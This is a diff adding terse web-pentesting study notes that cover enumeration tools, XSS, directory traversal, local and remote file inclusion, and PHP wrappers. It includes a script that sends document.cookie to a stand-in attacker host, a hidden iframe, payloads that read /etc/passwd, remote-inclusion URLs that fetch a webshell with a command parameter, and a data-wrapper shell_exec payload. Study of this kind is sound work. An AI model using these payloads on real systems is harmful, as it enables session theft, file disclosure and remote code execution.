@@ -1,0 +1,88 @@
+Enum
+
+
+	Inspect URLs and file types
+
+	Inspect Page Contents with F12
+
+	Check response headers on F12>>Network, might show server info & OS
+		"X-" are non-standard, worth Googling
+
+	Check sitemaps
+		curl http://www.victim.com/robots.txt or sitemap.xml
+
+	Check for Admin consoles
+
+
+Tools
+
+
+	DIRB (Directory Enum)
+		FeroxBuster? Supposedly faster
+
+	Burp Suite (God's gift to web pentesters)
+		Proxy
+		Intruder (Automate brute force when unique cookies are being used)
+			"Pitchfork" for payload type
+			"Recursive grep" for cookie fields
+		Repeater
+	
+	Nikto (Vuln Scanner)
+
+
+Cross-Site Scripting (XSS)
+
+
+	POC
+		<aleart> or <prompt>
+
+	iframes
+
+		<iframe src=http://attacker/yourdirhere height="0" width="0"></iframe>
+
+	Flags
+
+		(Secure) will send cookies over HTTPS only
+		(HttpOnly) denies JS access to cookies
+
+	JS COOKIES STEALER
+
+		<script>new Image().src="http://attacker/cool.jpg?output="+document.cookie;</script>
+
+
+Directory Transversal
+
+
+	Standard ../../../../../etc/passwd
+
+		some scripts might remove "../" or "./". Hard to say how without source code
+
+	File?
+
+		Anything with a "file" parameter calls for a dir check
+		file=c:\windows\system32\drivers\etc\hosts
+		file=/etc/passwd
+
+
+File Inclusion
+
+
+	LFI
+
+		Poison logs with a webshell, then request the logs to execute code
+
+		file=/var/www/apache2/access.log?{command}
+
+	RFI
+
+		If we can specify the file we want, point to attacher HTTP server and upload a webshell
+
+		file=http://attacker/evil.txt
+
+		http://victim/vuln.php?file=http://attacker/evil.txt?cmd={command}
+
+	PHP Wrappers
+
+		Might just be able to run PHP code as is
+
+		http://attacker/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
